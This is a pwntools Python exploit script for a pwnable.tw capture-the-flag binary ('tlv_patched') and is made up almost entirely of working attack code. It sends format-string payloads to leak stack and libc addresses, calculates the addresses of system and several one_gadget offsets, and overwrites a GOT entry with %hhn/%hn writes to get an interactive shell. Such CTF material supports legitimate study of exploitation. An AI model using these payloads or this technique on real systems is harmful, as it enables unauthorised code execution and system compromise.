#!/usr/bin/python3
from pwn import *
import subprocess

elf = context.binary = ELF("tlv_patched")
libc = elf.libc

local = True 
if local:
    p = process("./tlv_patched")
    gdb.attach(p,'''
    b*receive+156
    c
    b*receive+151
    c
    ''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./tlv_patched', checksec=False)

def fmt(len, data):
    p.sendline(b"str")
    p.sendline(len + b" " + data)
    print("[*]Send: ", len + b" " + data)

#####################
# STEP_1: Leak_libc #
#####################

p.sendline(b"str")
p.sendline(b"20" + b" " + b"%p"*3 + b"-%61$p")
print("[*]Send: ", b"20" + b" " + b"%p"*3 + b"-%61$p")

p.recvuntil(b"Issue logged:  0x")
stack = int(p.recv(12),16) - 248
p.recvuntil(b"0x")
libc_base = int(p.recv(12),16) - 1133111 
libc_system = libc_base + 0x50d60
p.recvuntil(b"-0x")
print_plt = int(p.recv(12),16)  + 10912


b = (libc_system & 0xFF0000) >> 4*4
a = libc_system & 0xFFFF
print(hex(a-b))
print(hex(b))

print("[+]Libc_base:        ", hex(libc_base))
print("[+]Libc_system:      ", hex(libc_system))
print("[+]stack:            ", hex(stack))
print("[+]print_got_plt:    ", hex(print_plt))

#### One_gadget = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]
og1 = libc_base + 0x50a37
og2 = libc_base + 0xebcf1
og3 = libc_base + 0xebcf5
og4 = libc_base + 0xebcf8
print("[-]Gadget_1: ", hex(og1))
print("[-]Gadget_2: ", hex(og2))
print("[-]Gadget_3: ", hex(og3))
print("[-]Gadget_4: ", hex(og4))

p.sendline(b"str")

payload = b"90 %" + str(b-1).encode() + b"x%13$hhn%" + str(a-b).encode() + b"x%12$hn      "  + p64(print_plt) + p64(print_plt+2)
print(payload)

p.sendline(payload)

p.sendline(b"str")
p.sendline(b"20 sh")

p.interactive()